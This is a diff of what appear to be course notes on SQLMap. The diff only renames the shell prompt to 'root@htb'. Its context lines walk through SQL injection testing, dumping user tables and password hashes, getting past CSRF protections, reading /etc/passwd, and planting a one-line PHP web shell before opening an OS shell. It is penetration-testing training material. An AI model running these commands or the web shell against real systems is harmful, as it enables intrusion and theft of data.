@@ -17,7 +17,7 @@ The cheat sheet is a useful command reference for this module.
 &#x20; SQLMap Overview
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
+root@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
 
        ___
        __H__
@@ -60,7 +60,7 @@ SQLMap is pre-installed on your Pwnbox, and the majority of security-focused ope
 &#x20; SQLMap Overview
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo apt install sqlmap
+root@htb[/htb]$ sudo apt install sqlmap
 ```
 
 If we want to install manually, we can use the following command in the Linux terminal or the Windows command line:
@@ -68,7 +68,7 @@ If we want to install manually, we can use the following command in the Linux te
 &#x20; SQLMap Overview
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+root@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 ```
 
 After that, SQLMap can be run with:
@@ -76,7 +76,7 @@ After that, SQLMap can be run with:
 &#x20; SQLMap Overview
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python sqlmap.py
+root@htb[/htb]$ python sqlmap.py
 ```
 
 ***
@@ -108,7 +108,7 @@ SQLMap is the only penetration testing tool that can properly detect and exploit
 &#x20; SQLMap Overview
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -hh
+root@htb[/htb]$ sqlmap -hh
 ...SNIP...
   Techniques:
     --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
@@ -561,7 +561,7 @@ By pasting the clipboard content (`Ctrl-V`) into the command line, and changing 
 &#x20; Running SQLMap on an HTTP Request
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
+root@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
 ```
 
 When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. `--crawl`, `--forms` or `-g`).
@@ -575,7 +575,7 @@ In the most common scenario, `GET` parameters are provided with the usage of opt
 &#x20; Running SQLMap on an HTTP Request
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
+root@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
 ```
 
 In such cases, `POST` parameters `uid` and `name` will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter `uid` is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using `-p uid`. Otherwise, we could mark it inside the provided data with the usage of special marker `*` as follows:
@@ -583,7 +583,7 @@ In such cases, `POST` parameters `uid` and `name` will be tested for SQLi vulner
 &#x20; Running SQLMap on an HTTP Request
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
+root@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
 ```
 
 ***
@@ -620,7 +620,7 @@ To run SQLMap with an HTTP request file, we use the `-r` flag, as follows:
 &#x20; Running SQLMap on an HTTP Request
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -r req.txt
+root@htb[/htb]$ sqlmap -r req.txt
         ___
        __H__
  ___ ___["]_____ ___ ___  {1.4.9}
@@ -650,7 +650,7 @@ For example, if there is a requirement to specify the (session) cookie value to 
 &#x20; Running SQLMap on an HTTP Request
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+root@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
 ```
 
 The same effect can be done with the usage of option `-H/--header`:
@@ -658,7 +658,7 @@ The same effect can be done with the usage of option `-H/--header`:
 &#x20; Running SQLMap on an HTTP Request
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+root@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
 ```
 
 We can apply the same to options like `--host`, `--referer`, and `-A/--user-agent`, which are used to specify the same HTTP headers' values.
@@ -672,7 +672,7 @@ Also, if we wanted to specify an alternative HTTP method, other than `GET` and `
 &#x20; Running SQLMap on an HTTP Request
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
+root@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
 ```
 
 ***
@@ -688,7 +688,7 @@ However, in the case of a complex or long POST body, we can once again use the `
 &#x20; Running SQLMap on an HTTP Request
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat req.txt
+root@htb[/htb]$ cat req.txt
 HTTP / HTTP/1.0
 Host: www.example.com
 
@@ -714,7 +714,7 @@ Host: www.example.com
 &#x20; Running SQLMap on an HTTP Request
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -r req.txt
+root@htb[/htb]$ sqlmap -r req.txt
         ___
        __H__
  ___ ___[(]_____ ___ ___  {1.4.9}
@@ -771,9 +771,9 @@ The `-t` option stores the whole traffic content to an output file:
 &#x20; Handling SQLMap Errors
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
+root@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
 
-AbdulrahmanTamim@htb[/htb]$ cat /tmp/traffic.txt
+root@htb[/htb]$ cat /tmp/traffic.txt
 HTTP request [#1]:
 GET /?id=1 HTTP/1.1
 Host: www.example.com
@@ -809,7 +809,7 @@ Another useful flag is the `-v` option, which raises the verbosity level of the 
 &#x20; Handling SQLMap Errors
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
+root@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
         ___
        __H__
  ___ ___[,]_____ ___ ___  {1.4.9}
@@ -928,7 +928,7 @@ The best way to check for differences between used boundaries and payloads for d
 &#x20; Attack Tuning
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
+root@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
 
 ...SNIP...
 [14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
@@ -953,7 +953,7 @@ On the other hand, payloads used with the default `--level` value have a conside
 &#x20; Attack Tuning
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
+root@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
 ...SNIP...
 [14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
 [14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
@@ -969,7 +969,7 @@ As for vectors, we can compare used payloads as follows:
 &#x20; Attack Tuning
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u www.example.com/?id=1
+root@htb[/htb]$ sqlmap -u www.example.com/?id=1
 ...SNIP...
 [14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
 [14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
@@ -980,7 +980,7 @@ AbdulrahmanTamim@htb[/htb]$ sqlmap -u www.example.com/?id=1
 &#x20; Attack Tuning
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3
+root@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3
 
 ...SNIP...
 [14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
@@ -1107,7 +1107,7 @@ The following SQLMap command does all of the above:
 &#x20; Database Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
 
         ___
        __H__
@@ -1166,7 +1166,7 @@ In most common scenarios, after finding the current database name (i.e. `testdb`
 &#x20; Database Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
 
 ...SNIP...
 [13:59:24] [INFO] fetching tables for database: 'testdb'
@@ -1185,7 +1185,7 @@ After spotting the table name of interest, retrieval of its content can be done 
 &#x20; Database Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
 
 ...SNIP...
 Database: testdb
@@ -1219,7 +1219,7 @@ When dealing with large tables with many columns and/or rows, we can specify the
 &#x20; Database Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
 
 ...SNIP...
 Database: testdb
@@ -1241,7 +1241,7 @@ To narrow down the rows based on their ordinal number(s) inside the table, we ca
 &#x20; Database Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
 
 ...SNIP...
 Database: testdb
@@ -1265,7 +1265,7 @@ If there is a requirement to retrieve certain rows based on a known `WHERE` cond
 &#x20; Database Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
 
 ...SNIP...
 Database: testdb
@@ -1304,7 +1304,7 @@ If we wanted to retrieve the structure of all of the tables so that we can have 
 &#x20; Advanced Database Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema
 
 ...SNIP...
 Database: master
@@ -1361,7 +1361,7 @@ When dealing with complex database structures with numerous tables and columns, 
 &#x20; Advanced Database Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
 
 ...SNIP...
 [14:24:19] [INFO] searching tables LIKE 'user'
@@ -1398,7 +1398,7 @@ In the above example, we can immediately spot a couple of interesting data retri
 &#x20; Advanced Database Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
 
 ...SNIP...
 columns LIKE 'pass' were found in the following databases:
@@ -1448,7 +1448,7 @@ Once we identify a table containing passwords (e.g. `master.users`), we can retr
 &#x20; Advanced Database Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
 
 ...SNIP...
 [14:31:41] [INFO] fetching columns for table 'users' in database 'master'
@@ -1502,7 +1502,7 @@ Apart from user credentials found in DB tables, we can also attempt to dump the 
 &#x20; Advanced Database Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
 
 ...SNIP...
 [14:25:20] [INFO] fetching database users password hashes
@@ -1567,7 +1567,7 @@ Additionally, even in a case where the user does not explicitly specify the toke
 &#x20; Bypassing Web Application Protections
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+root@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
 
         ___
        __H__
@@ -1590,7 +1590,7 @@ In some cases, the web application may only require unique values to be provided
 &#x20; Bypassing Web Application Protections
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
 
 URI: http://www.example.com:80/?id=1&rp=99954
 URI: http://www.example.com:80/?id=1&rp=87216
@@ -1609,7 +1609,7 @@ Another similar mechanism is where a web application expects a proper parameter 
 &#x20; Bypassing Web Application Protections
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
 
 URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
 URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
@@ -1721,7 +1721,7 @@ To check whether we have DBA privileges with SQLMap, we can use the `--is-dba` o
 &#x20; OS Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
+root@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
 
         ___
        __H__
@@ -1755,7 +1755,7 @@ To test OS exploitation, let's try an exercise in which we do have DBA privilege
 &#x20; OS Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba
 
         ___
        __H__
@@ -1787,7 +1787,7 @@ Instead of manually injecting the above line through SQLi, SQLMap makes it relat
 &#x20; OS Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
 
         ___
        __H__
@@ -1822,7 +1822,7 @@ As we can see, SQLMap said `files saved` to a local file. We can `cat` the local
 &#x20; OS Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
+root@htb[/htb]$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -1845,7 +1845,7 @@ Still, many web applications require the ability for DBMSes to write data into f
 &#x20; OS Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+root@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
 Now, let's attempt to write this file on the remote server, in the `/var/www/html/` directory, the default server webroot for Apache. If we didn't know the server webroot, we will see how SQLMap can automatically find it.
@@ -1853,7 +1853,7 @@ Now, let's attempt to write this file on the remote server, in the `/var/www/htm
 &#x20; OS Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
 
         ___
        __H__
@@ -1889,7 +1889,7 @@ Now, we can attempt to access the remote PHP shell, and execute a sample command
 &#x20; OS Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-la
+root@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-la
 
 total 148
 drwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 .
@@ -1909,7 +1909,7 @@ Now that we confirmed that we could write a PHP shell to get command execution, 
 &#x20; OS Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell
 
         ___
        __H__
@@ -1942,7 +1942,7 @@ We see that SQLMap defaulted to `UNION` technique to get an OS shell, but eventu
 &#x20; OS Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
+root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
 
         ___
        __H__
